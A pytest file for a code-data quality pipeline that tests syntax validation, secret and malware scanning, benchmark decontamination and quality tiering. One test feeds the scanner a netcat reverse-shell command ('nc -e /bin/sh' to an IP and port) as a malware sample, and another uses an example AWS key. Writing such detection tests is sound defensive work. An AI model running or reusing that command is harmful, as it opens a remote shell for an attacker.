"""
Unit Tests for Data Quality, Syntax, Readability, Security, and Decontamination
"""
import pytest
from src.quality.syntax import SyntaxValidator
from src.quality.readability import ReadabilityEvaluator
from src.quality.security_scanner import SecurityScanner
from src.quality.decontamination import BenchmarkDecontaminationEngine
from src.quality.classifier import QualityAssessmentEngine, QualityTier

def test_syntax_validator_python():
    valid_code = "def add(a: int, b: int) -> int:\n    return a + b\n"
    is_valid, err = SyntaxValidator.validate(valid_code, "python")
    assert is_valid is True
    assert err is None

    invalid_code = "def broken(\n    return 42"
    is_valid, err = SyntaxValidator.validate(invalid_code, "python")
    assert is_valid is False
    assert "SyntaxError" in err

def test_syntax_validator_c_family():
    valid_c = "int main() { int x = 42; return x; }"
    is_valid, err = SyntaxValidator.validate(valid_c, "c")
    assert is_valid is True

    unclosed_brace = "int main() { if (1) { return 0; }"
    is_valid, err = SyntaxValidator.validate(unclosed_brace, "cpp")
    assert is_valid is False
    assert "Unclosed" in err

def test_security_scanner_clean():
    clean_code = "def calculate_pi(): return 3.14159"
    is_clean, violations, cat = SecurityScanner.scan(clean_code)
    assert is_clean is True
    assert len(violations) == 0
    assert cat == "CLEAN"

def test_security_scanner_detects_secrets():
    code_with_aws = 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\nprint(AWS_KEY)'
    is_clean, violations, cat = SecurityScanner.scan(code_with_aws)
    assert is_clean is False
    assert cat == "SECRETS"
    assert any("AWS_ACCESS_KEY" in v for v in violations)

def test_security_scanner_detects_malware():
    reverse_shell = "nc -e /bin/sh 192.168.1.1 4444"
    is_clean, violations, cat = SecurityScanner.scan(reverse_shell)
    assert is_clean is False
    assert cat == "MALWARE"

def test_benchmark_decontamination():
    engine = BenchmarkDecontaminationEngine(ngram_size=5)
    engine.index_benchmark_item("BenchmarkX", "def test_solution_unique_signature(data): return data")

    # Contaminated candidate
    candidate = "import os\ndef test_solution_unique_signature(data): return data\nprint('hello')"
    is_contam, matches = engine.check_contamination(candidate)
    assert is_contam is True
    assert len(matches) > 0

    # Clean candidate
    clean_candidate = "def completely_unrelated_custom_function(): return 123"
    is_contam, matches = engine.check_contamination(clean_candidate)
    assert is_contam is False

def test_quality_classifier_premium():
    engine = QualityAssessmentEngine()
    record = {
        "id": "rec_001",
        "content": '"""Documentation string."""\ndef compute_sum(a: int, b: int) -> int:\n    return a + b\n',
        "language": "python",
        "training_type": "pretraining"
    }
    tier, score, audit = engine.evaluate_record(record)
    assert tier in [QualityTier.PREMIUM, QualityTier.STANDARD]
    assert score >= 0.70

